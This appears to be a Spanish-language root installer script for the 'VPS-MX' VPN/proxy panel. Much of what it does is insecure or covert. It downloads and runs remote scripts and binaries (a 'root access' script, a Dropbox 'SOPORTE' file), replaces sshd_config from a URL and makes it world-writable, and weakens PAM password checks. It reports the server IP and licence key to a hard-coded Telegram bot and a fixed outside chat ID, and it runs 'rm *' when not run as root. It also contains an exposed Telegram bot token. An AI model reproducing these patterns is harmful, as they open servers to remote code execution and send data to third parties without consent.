#!/bin/bash
# Verificar si el usuario es root
if [ $(whoami) != 'root' ]; then
    echo -e "\e[1;31mPARA PODER USAR EL INSTALADOR ES NECESARIO SER ROOT\nAUN NO SABES COMO INICIAR COMO ROOT?\nDIGITA ESTE COMANDO EN TU TERMINAL ( sudo -i )\e[0m"
    rm *
    exit
fi
# Función para imprimir mensajes con colores
msg() {
    BRAN='\033[1;37m'
    VERMELHO='\e[31m'
    VERDE='\e[32m'
    AMARELO='\e[33m'
    AZUL='\e[34m'
    MAGENTA='\e[35m'
    MAG='\033[1;36m'
    NEGRITO='\e[1m'
    SEMCOR='\e[0m'

    case $1 in
    -ne) cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}" ;;
    -ama) cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}" ;;
    -verm) cor="${AMARELO}${NEGRITO}[!] ${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}" ;;
    -azu) cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}" ;;
    -verd) cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}" ;;
    -bra) cor="${VERMELHO}" && echo -ne "${cor}${2}${SEMCOR}" ;;
    "-bar2" | "-bar") cor="${VERMELHO}————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}" ;;
    esac
}
# Función para configurar el sistema operativo
os_system() {
    system=$(cat -n /etc/issue | grep 1 | cut -d ' ' -f6,7,8 | sed 's/1//' | sed 's/      //')
    distro=$(echo "$system" | awk '{print $1}')

    case $distro in
    Debian) vercion=$(echo $system | awk '{print $3}' | cut -d '.' -f1) ;;
    Ubuntu) vercion=$(echo $system | awk '{print $2}' | cut -d '.' -f1,2) ;;
    esac

    link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/${vercion}.list"

    case $vercion in
    8 | 9 | 10 | 11 | 16.04 | 18.04 | 20.04 | 20.10 | 21.04 | 21.10 | 22.04)
        wget -O /etc/apt/sources.list ${link} &>/dev/null
        ;;
    esac
}
# Función para mostrar una barra de progreso
fun_bar() {
    comando="$1"
    _=$( $comando >/dev/null 2>&1 ) &
    >/dev/null

    pid=$!
    while [[ -d /proc/$pid ]]; do
        echo -ne "  \033[1;33m["
        for ((i = 0; i < 40; i++)); do
            echo -ne "\033[1;31m>"
            sleep 0.1
        done
        echo -ne "\033[1;33m]"
        sleep 1s
        echo
        tput cuu1 && tput dl1
    done

    echo -ne "  \033[1;33m[\033[1;31m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[1;33m] - \033[1;32m OK \033[0m\n"
    sleep 1s
}
msg -bar2
echo -e " \e[97m\033[1;41m   =====>>►►  SCRIPT MOD LACASITAMX  ◄◄<<=====      \033[1;37m"
msg -bar2
msg -ama "               PREPARANDO INSTALACION"
msg -bar2

INSTALL_DIR_PARENT="/usr/local/vpsmxup/"
INSTALL_DIR=${INSTALL_DIR_PARENT}

if [ ! -d "$INSTALL_DIR" ]; then
    mkdir -p "$INSTALL_DIR_PARENT"
    cd "$INSTALL_DIR_PARENT"
    wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/zzupdate/zzupdate.default.conf -O /usr/local/vpsmxup/vpsmxup.default.conf &>/dev/null
else
    echo ""
fi

echo ""

apt install pv -y &>/dev/null
apt install pv -y -qq --silent >/dev/null 2>&1
os_system

echo -e "\e[1;31m    SISTEMA: \e[33m$distro $vercion"

killall apt apt-get >/dev/null 2>&1 && echo -e "\033[97m    ◽️ INTENTANDO DETENER UPDATER SECUNDARIO " | pv -qL 40

dpkg --configure -a >/dev/null 2>&1 && echo -e "\033[97m    ◽️ INTENTANDO RECONFIGURAR UPDATER " | pv -qL 40

apt list --upgradable &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO APT-LIST " | pv -qL 50

apt-get install software-properties-common -y >/dev/null 2>&1 && echo -e "\033[97m    ◽️ INSTALANDO S-P-C " | pv -qL 50

apt-get install curl -y &>/dev/null
apt-get install python -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO PY " | pv -qL 50

apt-get install python-pip -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO PY-PIP " | pv -qL 50

apt-get install python3 -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO PY3 " | pv -qL 50

apt-get install python3-pip -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO PY3-PIP " | pv -qL 50

sudo apt-add-repository universe -y >/dev/null 2>&1 && echo -e "\033[97m    ◽️ INSTALANDO LIBRERIA UNIVERSAL " | pv -qL 50

[[ $(dpkg --get-selections | grep -w "net-tools" | head -1) ]] || apt-get install net-tools -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO NET-TOOLS" | pv -qL 40

sed -i 's/.*pam_cracklib.so.*/password sufficient pam_unix.so sha512 shadow nullok try_first_pass #use_authtok/' /etc/pam.d/common-password >/dev/null 2>&1 && echo -e "\033[97m    ◽️ DESACTIVANDO PASS ALFANUMERICO " | pv -qL 50

apt-get install lsof -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO LSOF" | pv -qL 40

apt-get install bc -y &>/dev/null && echo -e "\033[97m    ◽️ INSTALANDO BC" | pv -qL 40

fun_bar 'sleep 0.1s'

rootvps() {
    echo -e "\033[31m     OPTENIENDO ACCESO ROOT    "
    wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/root.sh -O /usr/bin/rootlx &>/dev/null &>/dev/null
    chmod 775 /usr/bin/rootlx &>/dev/null
    rootlx
    clear
    echo -e "\033[31m     ACCESO ROOT CON ÉXITO    "
    sleep 1
    rm -rf /usr/bin/rootlx
}

msg -bar
echo -e "\033[1;37m  YA TIENES ACCESO ROOT A TU VPS?\n  ESTO SOLO FUNCIONA PARA (AWS,GOOGLECLOUD,AZURE,ETC)\n  SI YA TIENES ACCESO A ROOT SOLO IGNORA ESTE MENSAJE\n  Y SIGUE CON LA INSTALACION NORMAL..."
msg -bar
read -p "Responde [ s | n ]: " -e -i n rootvps

[[ "$rootvps" = "s" || "$rootvps" = "S" ]] && rootvps

msg -bar
clear

rm -rf /usr/bin/vpsmxup
rm -rf lista-arq
rm -rf LACASITA.sh

printTitle() {
    echo ""
    echo -e "\033[1;92m$1\033[1;91m"
    printf '%0.s-' $(seq 1 ${#1})
    echo ""
}

printTitle "Limpieza de caché local"
apt-get clean

printTitle "Actualizar información de paquetes disponibles"
apt-get update

printTitle "PAQUETES DE ACTUALIZACIÓN"
apt-get dist-upgrade -y

printTitle "Limpieza de paquetes (eliminación automática de paquetes no utilizados)"
apt-get autoremove -y

printTitle "Versión actual"
lsb_release -d

clear

cd $HOME

sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1 >/dev/null 2>&1

rm $(pwd)/$0 &>/dev/null

SCPdir="/etc/VPS-MX"
SCPinstal="$HOME/install"
SCPidioma="${SCPdir}/idioma"
SCPusr="${SCPdir}/controlador"
SCPfrm="${SCPdir}/herramientas"
SCPinst="${SCPdir}/protocolos"

myip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1)
myint=$(ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}')

rm -rf /etc/localtime &>/dev/null
ln -s /usr/share/zoneinfo/America/Chihuahua /etc/localtime &>/dev/null
rm -rf /usr/local/lib/systemubu1 &>/dev/null

clear

msg -bar2
msg -ama "     [ SCRIPT \033[1;97m MOD LACASITAMX\033[1;33m ]"
msg -bar
echo -e "\033[97m"
echo -e "  \033[41m    -- INSTALACION DE PAQUETES  --    \e[49m"
echo -e "  \033[100m     PONER ATENCION  PARA SIGUIENTE PREGUNTA     "
echo -e "\033[97m"

msg -bar

apt_get_install() {
    package=$1
    apt-get install $package -y &>/dev/null
    if [[ $(dpkg --get-selections | grep -w "$package" | head -1) ]]; then
        echo -e "\033[97m    # apt-get install $package......... \033[92mINSTALADO"
    else
        echo -e "\033[97m    # apt-get install $package......... \033[91mFALLO DE INSTALACION"
    fi
}

apt_get_install grep
apt_get_install gawk
apt_get_install mlocate
apt_get_install lolcat
apt_get_install at
apt_get_install nano
apt_get_install iptables-persistent
apt_get_install bc
apt_get_install lsof
apt_get_install figlet
apt_get_install cowsay
apt_get_install screen
apt_get_install python
apt_get_install python3
apt_get_install python3-pip
apt_get_install ufw
apt_get_install unzip
apt_get_install zip
apt_get_install apache2

sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf >/dev/null 2>&1
service apache2 restart >/dev/null 2>&1

msg -bar2

clear

idfix64_86() {

    clear

    msg -bar2  # Línea de separación
    msg -bar2  # Línea de separación

    echo ""
    echo -e "\e[91m   INSTALACION SEMI MANUAL DE PAQUETES "  # Mensaje de instalación semi-manual
    echo -e "\e[91m(En caso de pedir confirmacion escoja: #y#) \e[0m"  # Mensaje de instrucción
    echo ""

    sleep 7s  # Esperar 7 segundos

    apt-get update  # Actualizar la lista de paquetes disponibles
    apt-get upgrade -y  # Actualizar los paquetes instalados

    # Instalación de paquetes necesarios
    apt-get install curl -y
    apt-get install lsof -y
    apt-get install sudo -y
    apt-get install figlet -y
    apt-get install cowsay -y
    apt-get install bc -y
    apt-get install python -y
    apt-get install at -y
    apt-get install apache2 -y

    # Configuración de Apache para escuchar en el puerto 81
    sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf
    service apache2 restart  # Reiniciar el servicio de Apache

    clear  # Limpiar la pantalla
    clear  # Limpiar la pantalla
    clear  # Limpiar la pantalla

    msg -bar2  # Línea de separación
    msg -bar2  # Línea de separación

    echo ""
    echo -e "\e[91mESCOJER PRIMERO #All locales# Y LUEGO #en_US.UTF-8# \e[0m"  # Instrucciones para configurar locales
    echo ""

    sleep 7s  # Esperar 7 segundos

    # Configuración de locales
    export LANGUAGE=en_US.UTF-8 &&
    export LANG=en_US.UTF-8 &&
    export LC_ALL=en_US.UTF-8 &&
    export LC_CTYPE="en_US.UTF-8" &&
    locale-gen en_US.UTF-8 &&
    sudo apt-get -y install language-pack-en-base &&
    sudo dpkg-reconfigure locales

    clear  # Limpiar la pantalla
}


# Limpieza de pantalla
clear

# Mensaje de barra
msg -bar2

# Pregunta sobre errores en la instalación anterior
echo -e "\033[1;97m  ¿PRESENTÓ ALGÚN ERROR ALGUN PAQUETE ANTERIOR?"
msg -bar2

# Opciones para responder a la pregunta
echo -e "\033[1;32m 1- Escoja:(N) No. Para Instalación Normal"
echo -e "\033[1;31m 2- Escoja:(S) Si. Saltaron errores."
msg -bar2

# Mensaje de continuar instalación normalmente
echo -e "\033[1;39m Al presionar enter continuará la instalación normal"
msg -bar2

# Lectura de la respuesta del usuario
read -p " [ S | N ]: " idfix64_86

# Verificación de respuesta para iniciar función específica
[[ "$idfix64_86" = "s" || "$idfix64_86" = "S" ]] && idfix64_86

# Limpieza de pantalla
clear

# Función para obtener la dirección IP
fun_ipe() {
    MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
    MIP2=$(wget -qO- ifconfig.me)
    [[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
}

# Función para obtener la dirección IP
fun_ip() {
    MIP2=$(wget -qO- ifconfig.me)
    MIP=$(wget -qO- whatismyip.akamai.com)
    if [ $? -eq 0 ]; then
        IP="$MIP"
    else
        IP="$MIP2"
    fi
}

# Función para verificar la autenticidad del instalador
function_verify() {
    permited=$(curl -sSL "https://www.dropbox.com/s/nmau2w8vebewpq3/control")
    [[ $(echo $permited | grep "${IP}") = "" ]] && {
        clear
        echo -e "\n\n\n\033[1;91m————————————————————————————————————————————————————\n      ¡ESTA KEY NO CONCUERDA CON EL INSTALADOR! \n      BOT: @CONECTEDMX_BOT \n————————————————————————————————————————————————————\n\n\n"
        [[ -d /etc/VPS-MX ]] && rm -rf /etc/VPS-MX
        exit 1
    } || {
        v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
        echo "$v1" >/etc/versin_script
    }
}

# Función para configurar el idioma
funcao_idioma() {
    clear
    clear
    msg -bar2
    msg -bar2
    figlet " LACASITA" | lolcat
    echo -e "     ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL"
    msg -bar2
    pv="$(echo es)"
    [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
    byinst="true"
}

install_fim() {
    # Mensaje de finalización de la instalación
    msg -ama "               Finalizando Instalacion" && msg bar2

    # Descarga de archivos de control si no existen
    [[ $(find /etc/VPS-MX/controlador -name nombre.log | grep -w "nombre.log" | head -1) ]] || wget -O /etc/VPS-MX/controlador/nombre.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/nombre.log &>/dev/null

    [[ $(find /etc/VPS-MX/controlador -name IDT.log | grep -w "IDT.log" | head -1) ]] || wget -O /etc/VPS-MX/controlador/IDT.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/IDT.log &>/dev/null

    [[ $(find /etc/VPS-MX/controlador -name tiemlim.log | grep -w "tiemlim.log" | head -1) ]] || wget -O /etc/VPS-MX/controlador/tiemlim.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/tiemlim.log &>/dev/null

    # Creación de archivo de registro
    touch /usr/share/lognull &>/dev/null

    # Descarga de archivos y configuraciones adicionales
    wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/SPR -O /usr/bin/SPR &>/dev/null &>/dev/null
    chmod 775 /usr/bin/SPR &>/dev/null

    wget -O /usr/bin/SOPORTE https://www.dropbox.com/s/8oi0mt9ikv5z8d0/soporte &>/dev/null
    chmod 775 /usr/bin/SOPORTE &>/dev/null
    SOPORTE &>/dev/null

    # Activación del acceso
    echo "ACCESO ACTIVADO" >/usr/bin/SOPORTE

    # Descarga de utilidades y configuraciones
    wget -O /bin/rebootnb https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/rebootnb &>/dev/null
    chmod +x /bin/rebootnb

    wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &>/dev/null
    chmod +x /bin/resetsshdrop

    wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null

    wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/lacasitamx/ZETA/master/sshd &>/dev/null
    chmod 777 /etc/ssh/sshd_config

    # Configuración de archivos de inicio
    msg -bar2
    echo '#!/bin/sh -e' >/etc/rc.local
    sudo chmod +x /etc/rc.local
    echo "sudo rebootnb" >>/etc/rc.local
    echo "sudo resetsshdrop" >>/etc/rc.local
    echo "sleep 2s" >>/etc/rc.local
    echo "exit 0" >>/etc/rc.local

    # Copia de archivos de configuración de bash
    /bin/cp /etc/skel/.bashrc ~/
    echo 'clear' >>.bashrc
    echo 'echo ""' >>.bashrc
    echo 'figlet ":LACASITA:"|lolcat' >>.bashrc
    echo 'mess1="$(less /etc/VPS-MX/message.txt)" ' >>.bashrc
    echo 'echo "" ' >>.bashrc
    echo 'echo -e "\t\033[92mRESELLER : $mess1 "' >>.bashrc
    echo 'echo -e "\t\e[1;33mVERSION: \e[1;31m$(cat /etc/versin_script_new)"' >>.bashrc
    echo 'echo "" ' >>.bashrc
    echo 'echo -e "\t\033[97mPARA MOSTRAR PANEL BASH ESCRIBA: sudo menu "' >>.bashrc
    echo 'echo ""' >>.bashrc
    echo -e "         COMANDO PRINCIPAL PARA ENTRAR AL PANEL "
    echo -e "  \033[1;41m               sudo menu             \033[0;37m" && msg -bar2

    # Limpieza de archivos y reinicio de servicios
    rm -rf /usr/bin/pytransform &>/dev/null
    rm -rf LACASITA.sh
    rm -rf lista-arq
    service ssh restart &>/dev/null
    exit
}

ofus() {
    unset server
    server=$(echo ${txt_ofuscatw} | cut -d':' -f1)
    unset txtofus
    number=$(expr length $1)

    for ((i = 1; i < $number + 1; i++)); do
        txt[$i]=$(echo "$1" | cut -b $i)

        case ${txt[$i]} in
            ".") txt[$i]="C" ;;
            "C") txt[$i]="." ;;
            "3") txt[$i]="@" ;;
            "@") txt[$i]="3" ;;
            "5") txt[$i]="9" ;;
            "9") txt[$i]="5" ;;
            "6") txt[$i]="P" ;;
            "P") txt[$i]="6" ;;
            "L") txt[$i]="O" ;;
            "O") txt[$i]="L" ;;
        esac

        txtofus+="${txt[$i]}"
    done

    echo "$txtofus" | rev
}


verificar_arq() {
    [[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
    [[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
    [[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
    [[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}

    case $1 in
        "menu" | "message.txt" | "ID") ARQ="${SCPdir}/" ;; # Menú
        "usercodes") ARQ="${SCPusr}/" ;; # Panel SSRR
        "C-SSR.sh" | "openssh.sh" | "squid.sh" | "dropbear.sh" | "proxy.sh" | "openvpn.sh" | "ssl.sh" | "python.py" | "shadowsocks.sh" | "Shadowsocks-libev.sh" | "Shadowsocks-R.sh" | "v2ray.sh" | "slowdns.sh" | "budp.sh") ARQ="${SCPinst}/" ;; # Instalación
        "sockspy.sh" | "PDirect.py" | "PPub.py" | "PPriv.py" | "POpen.py" | "PGet.py") ARQ="${SCPinst}/" ;; # Instalación
        *) ARQ="${SCPfrm}/" ;; # Herramientas
    esac

    mv -f ${SCPinstal}/$1 ${ARQ}/$1
    chmod +x ${ARQ}/$1
}


NOTIFY() {
    clear
    clear
    msg -bar
    msg -ama " Notify-BOT (Notificasion Remota)|@LaCasitaMx_Noty_Bot "
    msg -bar
    echo -e "\033[1;94m Notify-BOT es un simple notificador de:"
    echo -e "\033[1;94m >> Usuario Expirado"
    echo -e "\033[1;94m >> Usuario Eliminado"
    echo -e "\033[1;94m >> Avisos de VPS Reiniciada"
    echo -e "\033[1;94m >> Avisos de Monitor de Protocolos"
    echo -e "\033[1;97m Inicie El BOT de Telegram"
    echo -e "\033[1;92m ¡¡ Para sacar su ID entre al BOT @conectedmx_bot"
    echo -e "\033[1;92m Aparesera algo parecido 👤 → Tu ID es: 45145564   "
    msg -bar
    echo -e "\033[1;93mIgrese un nombre para el VPS:\033[0;37m"
    read -p " " nombr
    echo "${nombr}" >/etc/VPS-MX/controlador/nombre.log
    echo -e "\033[1;93mIgrese su ID 👤:\033[0;37m"
    read -p " " idbot
    echo "${idbot}" >/etc/VPS-MX/controlador/IDT.log
    msg -bar
    echo -e "\033[1;32m              ID AGREGADO CON EXITO"
    msg -bar
    wget -qO- ifconfig.me >/etc/VPS-MX/IP.log
    ipt=$(less /etc/VPS-MX/IP.log) >/dev/null 2>&1
    Nip="$(echo $ipt)"
    NOM="$(less /etc/VPS-MX/controlador/nombre.log)"
    NOM1="$(echo $NOM)"
    IDB1=$(less /etc/VPS-MX/controlador/IDT.log) >/dev/null 2>&1
    IDB2=$(echo $IDB1) >/dev/null 2>&1
    KEY="2012880601:AAEJ3Kk18PGDzW57LpTMnVMn_pQYQKW3V9w"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    MSG="⚠️ ►► AVISO DE VPS: $NOM1 ⚠\n👉 ►► IP: $Nip\n👉 ►► MENSAJE DE PRUEBA\n🔰 ►► NOTI-BOT ACTIVADO CORRECTAMENTE"
    curl -s --max-time 10 -d "chat_id=$IDB2&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
    echo -e "\033[1;34m            SE ENVIO MENSAJE DE PRUEBA "
}


fun_ipe

# Descargas de archivos y configuración de permisos
wget -O /usr/bin/trans https://raw.githubusercontent.com/scriptsmx/script/master/Install/trans &>/dev/null
wget -O /bin/Desbloqueo.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/Desbloqueo.sh &>/dev/null
chmod +x /bin/Desbloqueo.sh
wget -O /bin/monitor.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/monitor.sh &>/dev/null
chmod +x /bin/monitor.sh
wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/estilos.css &>/dev/null

# Configuración de firewall
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp &>/dev/null
ufw allow 80/tcp &>/dev/null
ufw allow 3128/tcp &>/dev/null
ufw allow 8799/tcp &>/dev/null
ufw allow 8080/tcp &>/dev/null
ufw allow 81/tcp &>/dev/null

# Limpiar la pantalla y mostrar mensajes informativos
clear
msg -bar2
msg -ama "     [ SCRIPT \033[1;97m  MOD LACASITAMX\033[1;33m ]"
msg -ama "  \033[1;96m      🔰Usar Ubuntu 20 a 64 De Preferencia🔰 "
msg -bar2

# Verificar si se proporcionó un argumento al script y asignarlo a la variable id
[[ $1 = "" ]] && funcao_idioma || {
    [[ ${#1} -gt 2 ]] && funcao_idioma || id="$1"
}

# Función para manejar errores
error_fun() {
    msg -bar2 && msg -verm "ERROR entre VPS<-->GENERADOR (Port 81 TCP)" && msg -bar2
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}
    exit 1
}

# Función para manejar claves inválidas
invalid_key() {
    msg -bar2 && msg -verm "  Code Invalido -- #¡Key Invalida#! " && msg -bar2
    [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq
    rm -rf lista-arq
    exit 1
}

# Solicitar al usuario que ingrese una clave
while [[ ! $Key ]]; do
    msg -bar2 && msg -ne "\033[1;93m          >>> INGRESE SU KEY ABAJO <<<\n   \033[1;37m" && read Key
    tput cuu1 && tput dl1
done

msg -ne "    # Verificando Key # : "

# Descargar lista de archivos
cd $HOME
wget -O $HOME/lista-arq $(ofus "$Key")/$IP >/dev/null 2>&1 && echo -e "\033[1;32m Ofus Correcto" || {
    echo -e "\033[1;91m Ofus Incorrecto"
    invalid_key
    exit
}


# Obtener la IP
IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" >/usr/bin/venip

# Esperar 1 segundo
sleep 1s

# Verificar la función
function_verify

# Actualizar la base de datos
updatedb

# Verificar si la lista de archivos existe y la clave no es inválida
if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq | grep "Code de KEY Invalido!") ]]; then
    # Mensaje informativo
    msg -bar2
    msg -verd "    $(source trans -b es:${id} "Ficheros Copiados" | sed -e 's/[^a-z -]//ig'): \e[97m[\e[93m@conectedmx_bot\e[97m]"

    # Obtener la solicitud
    REQUEST=$(ofus "$Key" | cut -d'/' -f2)

    # Crear directorio de instalación si no existe
    [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}

    # Descargar archivos
    pontos="."
    stopping="Descargando Ficheros"
    for arqx in $(cat $HOME/lista-arq); do
        msg -verm "${stopping}${pontos}"
        wget --no-check-certificate -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} >/dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
        tput cuu1 && tput dl1
        pontos+="."
    done

    # Obtener la IP pública
    wget -qO- ifconfig.me >/etc/VPS-MX/IP.log

    # Definir variables para el mensaje de Telegram
    userid="${SCPdir}/ID"
    TOKEN="2012880601:AAEJ3Kk18PGDzW57LpTMnVMn_pQYQKW3V9w"
    URL="https://api.telegram.org/bot$TOKEN/sendMessage"

    # Crear mensaje de Telegram
    MSG="👇= KEY INSTALADO =👇 

 ╔═════ ▓▓ ࿇ ▓▓ ═════╗ 

 - - - - - - - ×∆× - - - - - - - 

 User ID: $(cat ${userid}) 

 - - - - - - - ×∆× - - - - - - - 

 Usuario: $(cat ${SCPdir}/message.txt) 

 - - - - - - - ×∆× - - - - - - - 

 IP: $(cat ${SCPdir}/IP.log) 

 - - - - - - - ×∆× - - - - - - - 

 KEY: $Key 

 - - - - - - - ×∆× - - - - - - - 

 By @alexmod80 

 - - - - - - - ×∆× - - - - - - - 

 ╚═════ ▓▓ ࿇ ▓▓ ═════╝ 
"

    # Enviar mensaje de Telegram
    activ=$(cat ${userid})
    curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
    curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null

    # Eliminar el archivo de registro de IP
    rm ${SCPdir}/IP.log &>/dev/null

    # Limpiar
    msg -bar2
    listaarqs="$(locate "lista-arq" | head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs
    cat /etc/bash.bashrc | grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >/etc/bash.bashrc.2
    echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >>/etc/bash.bashrc.2
    mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
    echo "${SCPdir}/menu" >/usr/bin/menu && chmod +x /usr/bin/menu
    echo "${SCPdir}/menu" >/usr/bin/VPSMX && chmod +x /usr/bin/VPSMX
    echo "$Key" >${SCPdir}/key.txt
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}
    [[ ${#id} -gt 2 ]] && echo "es" >${SCPidioma} || echo "${id}" >${SCPidioma}

    # Preguntar si se desea instalar el bot de notificaciones
    echo -e "${cor[2]}         DESEAS INSTALAR NOTI-BOT?(Default n)"
    echo -e "\033[1;34m  (Deves tener Telegram y el BOT: @LaCasitaMx_Noty_Bot)"
    msg -bar2
    read -p " [ s | n ]: " NOTIFY
    [[ "$NOTIFY" = "s" || "$NOTIFY" = "S" ]] && NOTIFY
    msg -bar2
    [[ ${byinst} = "true" ]] && install_fim

else
    # Si la clave es inválida, mostrar mensaje de error y limpiar
    invalid_key
    rm -rf LACASITA.sh lista-arq
fi
rm -rf LACASITA.sh lista-arq
